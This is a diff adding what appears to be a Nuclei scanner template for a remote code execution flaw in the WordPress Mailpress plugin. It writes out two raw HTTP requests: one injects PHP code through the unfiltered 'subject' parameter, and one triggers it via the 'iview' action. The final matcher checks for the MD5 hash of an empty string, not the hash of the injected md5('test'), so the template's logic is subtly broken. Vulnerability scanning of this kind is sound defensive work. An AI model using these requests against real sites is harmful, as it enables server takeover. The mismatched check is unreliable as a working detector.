@@ -1,0 +1,43 @@
+id: wordpress-plugin-mailpress-rce
+info:
+  name: WordPress Plugin Mailpress <= 4.5.2 RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    In the WordPress Mailpress Plugin, the subject parameter in the iview function in the mailpress/mp-includes/class/MP_Actions.class.php file is not filtered, leading to remote code execution.
+  tags: rce, wordpress
+  reference:
+    - https://github.com/Medicean/VulApps/tree/master/w/wordpress/2
+
+variables:
+  php_code: "<?php echo md5('test');?>"
+
+http:
+  - raw:
+      - |
+        POST /wp-content/plugins/mailpress/mp-includes/action.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject={{php_code}}&html=&plaintext=&mail_format=standard&autosave=1
+    matchers:
+      - type: regex
+        regex:
+          - "<autosave id=['\"](\\d+)['\"]"
+    extractors:
+      - type: regex
+        name: autosave_id
+        group: 1
+        regex:
+          - "<autosave id=['\"](\\d+)['\"]"
+        internal: true
+
+  - raw:
+      - |
+        GET /wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={{autosave_id}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "d41d8cd98f00b204e9800998ecf8427e"
